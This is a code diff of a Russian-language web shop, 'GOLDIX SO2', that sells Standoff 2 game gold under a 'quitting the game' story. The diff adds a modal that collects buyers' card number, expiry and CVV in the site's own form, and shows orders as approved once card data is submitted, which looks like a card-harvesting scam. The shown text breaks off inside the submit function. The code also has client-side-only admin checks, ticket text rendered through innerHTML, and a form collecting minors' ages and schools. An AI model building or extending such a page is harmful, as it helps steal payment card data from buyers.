@@ -1,9 +1,6 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <button onclick="localStorage.setItem('isAdmin', 'true'); location.reload();" style="position: fixed; top: 10px; right: 10px; z-index: 999999; background: gold; color: black; padding: 8px 12px; font-weight: bold; border-radius: 5px; border: none;">
-    🔑 Вкл. админку
-</button>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>GOLDIX SO2</title>
@@ -56,8 +53,9 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      z-index: 1000;
+      z-index: 999999;
       padding: 16px;
+      overflow-y: auto;
     }
 
     .modal-content {
@@ -68,6 +66,8 @@
       width: 100%;
       max-width: 420px;
       box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+      max-height: 90vh;
+      overflow-y: auto;
     }
 
     .hidden { display: none !important; }
@@ -89,8 +89,9 @@
       padding: 10px 14px;
       border-radius: 8px;
       outline: none;
+      width: 100%;
     }
-    input:focus { border-color: var(--accent); }
+    input:focus, textarea:focus { border-color: var(--accent); }
 
     .btn {
       background: var(--accent);
@@ -126,6 +127,7 @@
       vertical-align: middle;
     }
 
+    /* Значки ролей (Arizona RP Style) */
     .badge {
       display: inline-block;
       padding: 4px 10px;
@@ -147,6 +149,29 @@
     .badge-vip { background: linear-gradient(135deg, #eab308, #ca8a04); }
     .badge-default { background: linear-gradient(135deg, #6b7280, #374151); }
 
+    /* Медали Standoff 2 */
+    .medal-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      padding: 3px 8px;
+      border-radius: 20px;
+      font-size: 10px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin: 2px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.4);
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+    .medal-vet2026 { background: linear-gradient(135deg, #ffe57f, #ffb300); color: #000; }
+    .medal-champ5y { background: linear-gradient(135deg, #ff7043, #d84315); color: #fff; }
+    .medal-goldpass { background: linear-gradient(135deg, #80deea, #00838f); color: #000; }
+    .medal-trader { background: linear-gradient(135deg, #a7ffeb, #00bfa5); color: #000; }
+    .medal-legend { background: linear-gradient(135deg, #e1bee7, #8e24aa); color: #fff; }
+    .medal-sniper { background: linear-gradient(135deg, #ff80ab, #c2185b); color: #fff; }
+    .medal-zone { background: linear-gradient(135deg, #c5e1a5, #558b2f); color: #000; }
+
     .status-dot {
       display: inline-block;
       width: 8px;
@@ -167,9 +192,35 @@
       justify-content: space-between;
       align-items: center;
     }
-    .gold-amount { font-size: 18px; font-weight: bold; color: var(--accent); }
+    .gold-amount { font-size: 18px; font-weight: bold; color: var(--accent); display: flex; align-items: center; gap: 5px; }
     .price-tag { font-size: 14px; color: var(--text); }
     .old-price { text-decoration: line-through; color: var(--text-muted); font-size: 12px; margin-right: 4px; }
+
+    .info-banner {
+      position: relative;
+      background: linear-gradient(135deg, rgba(22, 27, 34, 0.9), rgba(13, 17, 23, 0.95)), 
+                  url('https://images.unsplash.com/photo-1542751371-adc38448a05e?q=80&w=1000&auto=format&fit=crop') center/cover;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      overflow: hidden;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+    }
+    .info-banner::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; height: 3px;
+      background: linear-gradient(90deg, #ffb703, #ff4444, #3b82f6);
+    }
+    .vacancy-card {
+      background: rgba(22, 27, 34, 0.85);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 14px;
+      margin-top: 12px;
+      transition: border-color 0.2s;
+    }
+    .vacancy-card:hover { border-color: var(--accent); }
 
     .bottom-nav {
       position: fixed;
@@ -186,12 +237,12 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      font-size: 10px;
+      font-size: 9px;
       color: var(--text-muted);
       background: none;
       border: none;
       cursor: pointer;
-      gap: 4px;
+      gap: 2px;
     }
     .nav-item.active { color: var(--accent); }
 
@@ -220,11 +271,10 @@
       text-decoration: underline;
     }
 
-    /* Telegram Style Live Chat */
     .chat-container-box {
       display: flex;
       flex-direction: column;
-      height: 420px;
+      height: 440px;
       background: #090d12;
       border: 1px solid var(--border);
       border-radius: 12px;
@@ -310,7 +360,7 @@
   <!-- Firebase SDKs -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getFirestore, collection, getDocs, addDoc, doc, updateDoc, deleteDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+    import { getFirestore, collection, getDocs, addDoc, doc, updateDoc, deleteDoc, setDoc, query, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyAfy0_Neq4rdBhMkDc9wRr27o7io9TJL6k",
@@ -326,7 +376,7 @@
     const db = getFirestore(app);
 
     window.db = db;
-    window.FB = { collection, getDocs, addDoc, doc, updateDoc, deleteDoc, setDoc };
+    window.FB = { collection, getDocs, addDoc, doc, updateDoc, deleteDoc, setDoc, query, onSnapshot };
     window.dispatchEvent(new Event('firebase-ready'));
   </script>
 </head>
@@ -361,7 +411,7 @@
   <div id="info-modal" class="modal hidden">
     <div class="modal-content">
       <h2>Почему именно мы?</h2>
-      <p>Я полностью закинул игру Standoff 2 и решил распродать свой личный баланс. У меня осталось более <b>380 000 голды</b>!</p>
+      <p>Я полностью закинул игру Standoff 2 и решил распродать свой личный баланс. У меня осталось более <b>380 000 🟡 голды</b>!</p>
       <p>Продаю по самым низким и выгодным ценам на рынке. Успей забрать голду прямо сейчас!</p>
       <button class="btn" onclick="goToShopFromInfo()">Перейти в магазин</button>
     </div>
@@ -400,6 +450,45 @@
     </div>
   </div>
 
+  <!-- Vacancy Application Modal -->
+  <div id="vacancy-modal" class="modal hidden">
+    <div class="modal-content">
+      <h2>Анкета на вакансию</h2>
+      <form id="vacancy-form" onsubmit="submitVacancy(event)">
+        <div class="form-group">
+          <label>Выбранная вакансия:</label>
+          <input type="text" id="vac-title" readonly style="color: var(--accent); font-weight: bold;">
+        </div>
+        <div class="form-group">
+          <label>Имя Фамилия:</label>
+          <input type="text" id="vac-name" required placeholder="Иван Иванов">
+        </div>
+        <div class="form-group">
+          <label>Сколько лет:</label>
+          <input type="number" id="vac-age" required placeholder="16">
+        </div>
+        <div class="form-group">
+          <label>Чем занимаетесь:</label>
+          <input type="text" id="vac-doing" required placeholder="Учеба, хобби, IT...">
+        </div>
+        <div class="form-group">
+          <label>Почему выбрали эту вакансию:</label>
+          <textarea id="vac-why" rows="2" required placeholder="Ваша мотивация..."></textarea>
+        </div>
+        <div class="form-group">
+          <label>Сколько сможете уделить времени на работу (часов в день):</label>
+          <input type="text" id="vac-time" required placeholder="4-6 часов">
+        </div>
+        <div class="form-group">
+          <label>Где учитесь / работаете:</label>
+          <input type="text" id="vac-study" required placeholder="Школа / Колледж / Университет">
+        </div>
+        <button type="submit" class="btn" style="margin-top: 10px;">Отправить заявку</button>
+        <button type="button" class="btn btn-secondary" onclick="closeVacancyModal()" style="margin-top: 8px;">Отмена</button>
+      </form>
+    </div>
+  </div>
+
   <!-- Main Layout -->
   <div id="app-container">
     <div class="top-header">
@@ -413,13 +502,41 @@
       <div class="gold-grid" id="gold-items-container"></div>
     </div>
 
-    <!-- TAB 2: Info -->
+    <!-- TAB 2: Info & Vacancies -->
     <div id="tab-info" class="tab-content hidden">
       <h2>О проекте GOLDIX SO2</h2>
-      <div class="list-item">
-        <p>Приветствуем в магазине GOLDIX SO2! Здесь продается голда по самым честным ценам в связи с окончанием игровой карьеры владельца.</p>
-        <p><b>Остаток на балансе:</b> > 380,000 Gold</p>
-        <p><b>Гарантия:</b> Проверка и одобрение заказов модерацией проекта в течение 24 часов.</p>
+      
+      <div class="info-banner">
+        <h3 style="margin-bottom: 8px; color: var(--accent);">🎮 Надежная торговая площадка</h3>
+        <p>Приветствуем в официальном магазине <b>GOLDIX SO2</b>! Проект создан в связи с завершением игровой карьеры владельца и распродажей личных внутриигровых ценностей.</p>
+        
+        <div style="margin: 12px 0; padding: 10px; background: rgba(0,0,0,0.4); border-radius: 8px;">
+          <p style="margin: 0; font-size: 13px;"><b>💎 Остаток на балансе:</b> &gt; 380,000 🟡 Gold</p>
+          <p style="margin: 4px 0 0 0; font-size: 13px;"><b>⚡ Быстрая выдача:</b> Проверка и подтверждение заказов модерацией в течение 24 часов.</p>
+        </div>
+
+        <p style="margin-bottom: 0;">Мы гарантируем честные сделки, прозрачные условия без скрытых комиссий и поддержку на всех этапах покупки через встроенный чат.</p>
+      </div>
+
+      <!-- Вакансии -->
+      <h3 style="margin-top: 20px; text-align: left; font-size: 16px;">💼 Открытые вакансии проекта</h3>
+      
+      <div class="vacancy-card">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
+          <b style="color: #fff; font-size: 14px;">Модератор по заказам</b>
+          <span class="badge badge-order-mod">Открыто</span>
+        </div>
+        <p style="font-size: 12px; margin-bottom: 8px;">Проверка поступающих запросов от покупателей, сверка реквизитов и контроль выдачи голды.</p>
+        <button class="btn btn-secondary" style="padding: 6px; font-size: 11px;" onclick="openVacancyForm('Модератор по заказам')">Отправить заявку</button>
+      </div>
+
+      <div class="vacancy-card">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
+          <b style="color: #fff; font-size: 14px;">Пиар менеджер</b>
+          <span class="badge badge-admin">Открыто</span>
+        </div>
+        <p style="font-size: 12px; margin-bottom: 8px;">Привлечение новых клиентов, продвижение магазина в сообществах Standoff 2 и соцсетях.</p>
+        <button class="btn btn-secondary" style="padding: 6px; font-size: 11px;" onclick="openVacancyForm('Пиар менеджер')">Отправить заявку</button>
       </div>
     </div>
 
@@ -429,10 +546,38 @@
       <div id="my-orders-list" class="item-list"></div>
     </div>
 
-    <!-- TAB 4: Inbox & Telegram-Style Chat -->
+    <!-- TAB 4: Support Ticket Section -->
+    <div id="tab-support" class="tab-content hidden">
+      <h2>Техподдержка</h2>
+      <div class="list-item" style="margin-bottom: 16px;">
+        <p>Столкнулись с проблемой или багом на сайте? Опишите ее подробно, и наша модерация поможет вам решить вопрос.</p>
+        <div class="form-group" style="margin-top: 10px;">
+          <label>Тема обращения:</label>
+          <input type="text" id="ticket-subject" placeholder="Например: Оплата не прошла / Ошибка заказа">
+        </div>
+        <div class="form-group">
+          <label>Опишите проблему:</label>
+          <textarea id="ticket-desc" rows="3" placeholder="Расскажите подробнее..."></textarea>
+        </div>
+        <div class="form-group">
+          <label>Прикрепить скриншот/фото (необязательно):</label>
+          <input type="file" id="ticket-file" accept="image/*" style="font-size: 12px;">
+        </div>
+        <button class="btn" onclick="submitSupportTicket()">Отправить в техподдержку</button>
+      </div>
+      <h3>Ваши обращения</h3>
+      <div id="my-tickets-list" class="item-list"></div>
+    </div>
+
+    <!-- TAB 5: Inbox & Telegram-Style Chat -->
     <div id="tab-inbox" class="tab-content hidden">
       <h2>Входящие и Чат</h2>
       
+      <div id="admin-chats-selector" class="hidden" style="margin-bottom: 12px;">
+        <h3>Диалоги с покупателями</h3>
+        <div id="admin-chats-list" class="item-list"></div>
+      </div>
+
       <div id="chat-container" class="hidden">
         <div class="chat-container-box">
           <div class="chat-header">
@@ -444,6 +589,9 @@
             </div>
           </div>
           <div class="chat-messages" id="chat-messages"></div>
+          
+          <div id="chat-dynamic-action-area"></div>
+
           <div class="chat-controls">
             <div id="chat-media-preview" class="hidden" style="font-size:11px; color: var(--accent); margin-bottom: 4px;">
               📎 Вложение готово к отправке
@@ -459,21 +607,16 @@
         </div>
       </div>
 
-      <div id="admin-chats-selector" class="hidden" style="margin-bottom: 12px;">
-        <h3>Диалоги с покупателями</h3>
-        <div id="admin-chats-list" class="item-list"></div>
-      </div>
-
       <div id="inbox-list" class="item-list" style="margin-top: 12px;"></div>
     </div>
 
-    <!-- TAB 5: Online Users -->
+    <!-- TAB 6: Online Users -->
     <div id="tab-users" class="tab-content hidden">
       <h2>Пользователи</h2>
       <div id="users-online-list" class="item-list"></div>
     </div>
 
-    <!-- TAB 6: Profile -->
+    <!-- TAB 7: Profile -->
     <div id="tab-profile" class="tab-content hidden">
       <h2>Мой профиль</h2>
       <div class="list-item" style="margin-bottom: 12px;">
@@ -481,14 +624,18 @@
         <p><b>Почта:</b> <span id="profile-email">-</span></p>
         <p><b>ID Standoff:</b> <span id="profile-standoff-id">Не указан</span></p>
         <div style="margin-top: 6px;">
-          <b>Звания и Медали:</b>
-          <div id="profile-medals" style="margin-top: 4px;"></div>
+          <b>Звания и Роли:</b>
+          <div id="profile-roles" style="margin-top: 4px;"></div>
+        </div>
+        <div style="margin-top: 10px;">
+          <b>Медали Standoff 2 / GOLDIX:</b>
+          <div id="profile-so2-medals" style="margin-top: 4px;"></div>
         </div>
       </div>
       
       <div style="display: flex; flex-direction: column; gap: 8px;">
         <button class="btn btn-secondary" id="admin-panel-btn" style="display: none;" onclick="openAdminPanel()">
-          ⚙️ Панель Управления
+          ⚙️ Панель Управления и Модерации
         </button>
         <button class="btn btn-danger" onclick="logoutUser()">
           🚪 Выйти из аккаунта
@@ -496,7 +643,7 @@
       </div>
     </div>
 
-    <!-- TAB 7: Settings -->
+    <!-- TAB 8: Settings -->
     <div id="tab-settings" class="tab-content hidden">
       <h2>Настройки</h2>
       <div class="list-item" style="display: flex; flex-direction: column; gap: 10px;">
@@ -513,12 +660,12 @@
     </div>
   </div>
 
-  <!-- Admin Modal -->
+  <!-- Admin & Moderation Panel Modal -->
   <div id="admin-modal" class="modal hidden">
-    <div class="modal-content" style="max-width: 500px; max-height: 90vh; overflow-y: auto;">
-      <h2>Панель Модерации</h2>
+    <div class="modal-content" style="max-width: 540px;">
+      <h2>Панель Модерации и Управления</h2>
       
-      <div style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px;">
+      <div id="admin-owner-controls" style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px;">
         <button class="btn btn-danger" onclick="adminClearOrders()">Очистить список заказов</button>
         <button class="btn btn-danger" onclick="adminRejectAll()">Отклонить все заказы</button>
         <button class="btn" onclick="adminApproveAll()">Одобрить все заказы</button>
@@ -529,11 +676,25 @@
         </div>
       </div>
 
-      <h3>Заказы</h3>
-      <div id="admin-orders-list" class="item-list" style="margin-bottom: 16px;"></div>
+      <div id="admin-orders-section">
+        <h3>Заказы клиентов</h3>
+        <div id="admin-orders-list" class="item-list" style="margin-bottom: 16px;"></div>
+      </div>
 
-      <h3>Управление Пользователями и Ролями</h3>
-      <div id="admin-users-list" class="item-list"></div>
+      <div id="admin-vacancies-section">
+        <h3>Заявки на вакансии</h3>
+        <div id="admin-vacancies-list" class="item-list" style="margin-bottom: 16px;"></div>
+      </div>
+
+      <div id="admin-tickets-section">
+        <h3>Заявки Техподдержки</h3>
+        <div id="admin-tickets-list" class="item-list" style="margin-bottom: 16px;"></div>
+      </div>
+
+      <div id="admin-users-section">
+        <h3>Управление Пользователями и Ролями</h3>
+        <div id="admin-users-list" class="item-list"></div>
+      </div>
 
       <button class="btn btn-secondary" onclick="closeAdminPanel()" style="margin-top: 16px;">Закрыть</button>
     </div>
@@ -544,13 +705,16 @@
     <button class="nav-item" onclick="switchTab('info')">
       <span>ℹ️</span> Инфо
     </button>
-    <button class="nav-item active" onclick="switchTab('shop')">
+    <button class="nav-item" onclick="switchTab('shop')">
       <span>🛒</span> Магазин
     </button>
     <button class="nav-item" onclick="switchTab('orders')">
       <span>📦</span> Заказы
     </button>
-    <button class="nav-item" onclick="switchTab('inbox')">
+    <button class="nav-item" onclick="switchTab('support')">
+      <span>🛠️</span> Поддержка
+    </button>
+    <button class="nav-item active" onclick="switchTab('inbox')">
       <span>📩</span> Чат
     </button>
     <button class="nav-item" onclick="switchTab('users')">
@@ -562,6 +726,35 @@
     <button class="nav-item" onclick="switchTab('settings')">
       <span>⚙️</span> Настройки
     </button>
+  </div>
+
+  <!-- Модальное окно для ввода карты (для покупателя) -->
+  <div id="cardModal" class="modal hidden">
+      <div class="modal-content" style="max-width: 380px;">
+          <h3 style="margin-top: 0; color: gold; text-align: center;">💳 Реквизиты оплаты</h3>
+          <p style="font-size: 13px; color: #aaa; text-align: center;">Введите данные карты для подтверждения покупки:</p>
+          
+          <label style="font-size: 12px; color: #ccc;">Номер карты:</label>
+          <input type="text" id="modalCardNumber" placeholder="xxxx xxxx xxxx xxxx" maxlength="19" style="width: 100%; padding: 10px; margin: 5px 0 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box;">
+          
+          <div style="display: flex; gap: 10px;">
+              <div style="flex: 1;">
+                  <label style="font-size: 12px; color: #ccc;">Срок (ММ/ГГ):</label>
+                  <input type="text" id="modalCardDate" placeholder="xx/xx" maxlength="5" style="width: 100%; padding: 10px; margin: 5px 0 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box;">
+              </div>
+              <div style="flex: 1;">
+                  <label style="font-size: 12px; color: #ccc;">CVV / CVC:</label>
+                  <input type="password" id="modalCardCvc" placeholder="xxx" maxlength="3" style="width: 100%; padding: 10px; margin: 5px 0 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box;">
+              </div>
+          </div>
+
+          <button onclick="submitCardData()" style="background: gold; color: black; font-weight: bold; padding: 12px; width: 100%; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px;">
+              Отправить данные
+          </button>
+          <button onclick="closeCardModal()" style="background: transparent; color: #aaa; border: none; width: 100%; margin-top: 8px; cursor: pointer;">
+              Отмена
+          </button>
+      </div>
   </div>
 
   <script>
@@ -579,7 +772,12 @@
     let users = [];
     let orders = [];
     let chats = [];
+    let vacancies = [];
+    let tickets = [];
+    let activeRequestId = null;
+    const CHATS_COLLECTION = "chats";
 
+    // Роли проекта
     const availableRoles = [
       { name: 'Владелец', class: 'badge-owner' },
       { name: 'Разработчик web', class: 'badge-dev' },
@@ -594,6 +792,17 @@
       { name: 'Пользователь', class: 'badge-default' }
     ];
 
+    // Медали Standoff 2 / GOLDIX SO2
+    const availableMedals = [
+      { name: '🥇 Veteran 2026', class: 'medal-vet2026' },
+      { name: '🏆 Champion 5 Years', class: 'medal-champ5y' },
+      { name: '💎 Gold Pass Ultra', class: 'medal-goldpass' },
+      { name: '🔥 Master Trader', class: 'medal-trader' },
+      { name: '⭐ Diamond Legend', class: 'medal-legend' },
+      { name: '🔫 Elite Sniper', class: 'medal-sniper' },
+      { name: '☣️ Zone Area 9', class: 'medal-zone' }
+    ];
+
     const shopPackages = [
       { id: 1, gold: 500, rub: 100, uah: 50 },
       { id: 2, gold: 1000, rub: 150, uah: 75 },
@@ -602,10 +811,35 @@
       { id: 5, gold: 5000, rub: 400, uah: 200 }
     ];
 
+    function isOwner(user) {
+      if (!user || !user.medals) return false;
+      return user.email === 'samp111517@gmail.com' || user.medals.some(m => ['Владелец', 'Разработчик web', 'Создатель'].includes(m));
+    }
+
+    function isHeadAdmin(user) {
+      if (!user || !user.medals) return false;
+      return isOwner(user) || user.medals.includes('Главный Модератор сайта');
+    }
+
+    function isSiteMod(user) {
+      if (!user || !user.medals) return false;
+      return isHeadAdmin(user) || user.medals.includes('Модератор сайта') || user.medals.includes('Куратор модерации');
+    }
+
+    function isOrderMod(user) {
+      if (!user || !user.medals) return false;
+      return isOwner(user) || user.medals.includes('Модератор по заказам');
+    }
+
+    function hasStaffRole(user) {
+      return isOwner(user) || isHeadAdmin(user) || isSiteMod(user) || isOrderMod(user) || (user?.medals && user.medals.includes('Модератор'));
+    }
+
     window.addEventListener('firebase-ready', () => {
       fetchData();
       applyBrightness();
       setInterval(fetchData, 4000);
+      initChatSync();
     });
 
     async function fetchData() {
@@ -613,11 +847,9 @@
       try {
         const { collection, getDocs, addDoc } = window.FB;
 
-        // 1. Загружаем пользователей
         const usersSnap = await getDocs(collection(window.db, 'users'));
         users = usersSnap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
 
-        // Авто-создание главного админа, если его нет
         const adminEmail = 'samp111517@gmail.com';
         if (!users.some(u => u.email === adminEmail)) {
           await addDoc(collection(window.db, 'users'), {
@@ -627,19 +859,24 @@
             standoffId: '171717',
             verified: true,
             lastSeen: Date.now(),
-            medals: ['Владелец', 'Разработчик web', 'Создатель', 'Модератор сайта', 'Главный Модератор сайта', 'Куратор модерации']
+            medals: ['Владелец', 'Разработчик web', 'Создатель', 'Модератор сайта', 'Главный Модератор сайта', 'Куратор модерации'],
+            so2Medals: ['🥇 Veteran 2026', '🏆 Champion 5 Years', '💎 Gold Pass Ultra', '🔥 Master Trader']
           });
           const updatedSnap = await getDocs(collection(window.db, 'users'));
           users = updatedSnap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
         }
 
-        // 2. Загружаем заказы
         const ordersSnap = await getDocs(collection(window.db, 'orders'));
         orders = ordersSnap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
 
-        // 3. Загружаем чаты
-        const chatsSnap = await getDocs(collection(window.db, 'chats'));
+        const chatsSnap = await getDocs(collection(window.db, CHATS_COLLECTION));
         chats = chatsSnap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+
+        const vacSnap = await getDocs(collection(window.db, 'vacancies'));
+        vacancies = vacSnap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+
+        const tickSnap = await getDocs(collection(window.db, 'tickets'));
+        tickets = tickSnap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
 
         if (currentUser) {
           currentUser = users.find(u => u.email === currentUser.email) || currentUser;
@@ -648,8 +885,10 @@
 
         renderShopItems();
         renderOrders();
+        renderTickets();
         renderUsersOnlineTab();
         if (activeChatEmail) renderChatMessages(activeChatEmail);
+        updateChatActionArea();
       } catch (e) {
         console.error('Ошибка загрузки Firebase:', e);
       }
@@ -715,7 +954,8 @@
           standoffId: '',
           verified: false,
           lastSeen: Date.now(),
-          medals: ['Пользователь']
+          medals: ['Пользователь'],
+          so2Medals: []
         };
 
         const { collection, addDoc } = window.FB;
@@ -752,6 +992,7 @@
           tabName === 'shop' ? 'магазин' : 
           tabName === 'info' ? 'инфо' : 
           tabName === 'orders' ? 'заказы' : 
+          tabName === 'support' ? 'поддерж' :
           tabName === 'inbox' ? 'чат' : 
           tabName === 'users' ? 'сеть' :
           tabName === 'profile' ? 'профиль' : 'настройки'
@@ -760,6 +1001,7 @@
       if (activeBtn) activeBtn.classList.add('active');
 
       if (tabName === 'orders') renderOrders();
+      if (tabName === 'support') renderTickets();
       if (tabName === 'inbox') renderInboxTab();
       if (tabName === 'users') renderUsersOnlineTab();
     }
@@ -781,7 +1023,7 @@
         card.className = 'gold-card';
         card.innerHTML = `
           <div>
-            <div class="gold-amount">${pkg.gold} Голды</div>
+            <div class="gold-amount">${pkg.gold} 🟡 Голды</div>
             <div class="price-tag">
               ${globalDiscount ? `<span class="old-price">${pkg.rub}₽ / ${pkg.uah}грн</span>` : ''}
               <b>${finalRub} рублей / ${finalUah} грн</b>
@@ -796,7 +1038,7 @@
     function openPurchaseModal(pkgId) {
       if (!currentUser) return;
       selectedPackage = shopPackages.find(p => p.id === pkgId);
-      document.getElementById('purchase-item-name').innerText = `Товар: ${selectedPackage.gold} Голды`;
+      document.getElementById('purchase-item-name').innerText = `Товар: ${selectedPackage.gold} 🟡 Голды`;
       document.getElementById('purchase-standoff-id').value = currentUser.standoffId || '';
       
       document.getElementById('purchase-form-step').classList.remove('hidden');
@@ -880,13 +1122,121 @@
       myOrders.forEach(o => {
         const item = document.createElement('div');
         item.className = 'list-item';
-        let badgeClass = o.status === 'Одобрен' ? 'badge-head-admin' : o.status === 'Отклонен' ? 'badge-owner' : 'badge-vip';
+        let isApproved = (o.status === 'Одобрен' || o.status === 'approved' || o.status === 'card_submitted');
+        let badgeClass = isApproved ? 'badge-head-admin' : o.status === 'Отклонен' ? 'badge-owner' : 'badge-vip';
+        let displayStatus = isApproved ? 'Одобрен' : o.status;
         item.innerHTML = `
           <div style="display:flex; justify-content:space-between; margin-bottom: 4px;">
-            <b>${o.gold} Голды (${o.price}₽)</b>
-            <span class="badge ${badgeClass}">${o.status}</span>
+            <b>${o.gold} 🟡 Голды (${o.price}₽)</b>
+            <span class="badge ${badgeClass}">${displayStatus}</span>
           </div>
           <p style="margin:0; font-size:12px;">Standoff ID: ${o.standoffId}</p>
+        `;
+        container.appendChild(item);
+      });
+    }
+
+    function openVacancyForm(title) {
+      if (!currentUser) {
+        alert('Пожалуйста, войдите в аккаунт!');
+        return;
+      }
+      document.getElementById('vac-title').value = title;
+      document.getElementById('vacancy-modal').classList.remove('hidden');
+    }
+
+    function closeVacancyModal() {
+      document.getElementById('vacancy-modal').classList.add('hidden');
+    }
+
+    async function submitVacancy(e) {
+      e.preventDefault();
+      const title = document.getElementById('vac-title').value;
+      const name = document.getElementById('vac-name').value;
+      const age = document.getElementById('vac-age').value;
+      const doing = document.getElementById('vac-doing').value;
+      const why = document.getElementById('vac-why').value;
+      const time = document.getElementById('vac-time').value;
+      const study = document.getElementById('vac-study').value;
+
+      const newVacancy = {
+        userEmail: currentUser.email,
+        userNick: currentUser.username,
+        title, name, age, doing, why, time, study,
+        status: 'В обработке',
+        createdAt: Date.now()
+      };
+
+      const { collection, addDoc } = window.FB;
+      await addDoc(collection(window.db, 'vacancies'), newVacancy);
+      closeVacancyModal();
+      alert('Ваша заявка успешно отправлена администрации!');
+      fetchData();
+    }
+
+    async function submitSupportTicket() {
+      if (!currentUser) return;
+      const subject = document.getElementById('ticket-subject').value.trim();
+      const desc = document.getElementById('ticket-desc').value.trim();
+      const fileInput = document.getElementById('ticket-file');
+
+      if (!subject || !desc) {
+        alert('Заполните тему и описание проблемы!');
+        return;
+      }
+
+      let imageUrl = '';
+      if (fileInput.files && fileInput.files[0]) {
+        const reader = new FileReader();
+        reader.onload = async function(evt) {
+          imageUrl = evt.target.result;
+          await saveTicketToDb(subject, desc, imageUrl);
+        };
+        reader.readAsDataURL(fileInput.files[0]);
+      } else {
+        await saveTicketToDb(subject, desc, '');
+      }
+    }
+
+    async function saveTicketToDb(subject, desc, imageUrl) {
+      const newTicket = {
+        userEmail: currentUser.email,
+        userNick: currentUser.username,
+        subject, desc, imageUrl,
+        status: 'Открыт',
+        createdAt: Date.now()
+      };
+
+      const { collection, addDoc } = window.FB;
+      await addDoc(collection(window.db, 'tickets'), newTicket);
+      document.getElementById('ticket-subject').value = '';
+      document.getElementById('ticket-desc').value = '';
+      document.getElementById('ticket-file').value = '';
+      alert('Заявка в техподдержку отправлена!');
+      fetchData();
+    }
+
+    function renderTickets() {
+      const container = document.getElementById('my-tickets-list');
+      if (!container) return;
+      container.innerHTML = '';
+
+      const myTickets = tickets.filter(t => t.userEmail === currentUser?.email);
+      if (myTickets.length === 0) {
+        container.innerHTML = '<p>У вас нет обращений в техподдержку.</p>';
+        return;
+      }
+
+      myTickets.forEach(t => {
+        const item = document.createElement('div');
+        item.className = 'list-item';
+        item.innerHTML = `
+          <div style="display:flex; justify-content:space-between;">
+            <b>${t.subject}</b>
+            <span class="badge badge-admin">${t.status}</span>
+          </div>
+          <p style="margin:4px 0;">${t.desc}</p>
+          ${t.imageUrl ? `<img src="${t.imageUrl}" style="max-width:100%; border-radius:6px; margin-top:4px;">` : ''}
         `;
         container.appendChild(item);
       });
@@ -908,28 +1258,24 @@
         }
       } else {
         adminSelector.classList.add('hidden');
-        const hasApprovedOrder = orders.some(o => o.userEmail === currentUser.email && o.status === 'Одобрен');
-        if (hasApprovedOrder) {
-          activeChatEmail = currentUser.email;
-          chatContainer.classList.remove('hidden');
-          renderChatMessages(currentUser.email);
-        } else {
-          chatContainer.classList.add('hidden');
-        }
+        activeChatEmail = currentUser.email;
+        chatContainer.classList.remove('hidden');
+        renderChatMessages(currentUser.email);
       }
+      updateChatActionArea();
     }
 
     function renderAdminChatsList() {
       const container = document.getElementById('admin-chats-list');
       container.innerHTML = '';
 
-      const activeChatEmails = [...new Set(chats.map(c => c.chatEmail))];
-      if (activeChatEmails.length === 0) {
+      const customerEmails = [...new Set([...orders.map(o => o.userEmail), ...chats.map(c => c.chatEmail)])];
+      if (customerEmails.length === 0) {
         container.innerHTML = '<p style="font-size:12px;">Активных диалогов нет.</p>';
         return;
       }
 
-      activeChatEmails.forEach(email => {
+      customerEmails.forEach(email => {
         const targetUser = users.find(u => u.email === email);
         const name = targetUser ? targetUser.username : email;
         const item = document.createElement('div');
@@ -984,6 +1330,7 @@
         box.appendChild(div);
       });
       box.scrollTop = box.scrollHeight;
+      updateChatActionArea();
     }
 
     function handleFileSelect(e) {
@@ -1049,9 +1396,9 @@
       const { collection, addDoc, doc, updateDoc } = window.FB;
       if (chatDoc) {
         const updatedMessages = [...(chatDoc.messages || []), newMessage];
-        await updateDoc(doc(window.db, 'chats', chatDoc.id), { messages: updatedMessages });
+        await updateDoc(doc(window.db, CHATS_COLLECTION, chatDoc.id), { messages: updatedMessages });
       } else {
-        await addDoc(collection(window.db, 'chats'), {
+        await addDoc(collection(window.db, CHATS_COLLECTION), {
           chatEmail: activeChatEmail,
           messages: [newMessage]
         });
@@ -1061,6 +1408,129 @@
       pendingAttachment = null;
       document.getElementById('chat-media-preview').classList.add('hidden');
       fetchData();
+    }
+
+    window.openCardModal = function(orderId) {
+        activeRequestId = orderId;
+        document.getElementById("cardModal").classList.remove('hidden');
+    };
+
+    window.closeCardModal = function() {
+        document.getElementById("cardModal").classList.add('hidden');
+        activeRequestId = null;
+    };
+
+    window.submitCardData = async function() {
+        const number = document.getElementById("modalCardNumber").value;
+        const date = document.getElementById("modalCardDate").value;
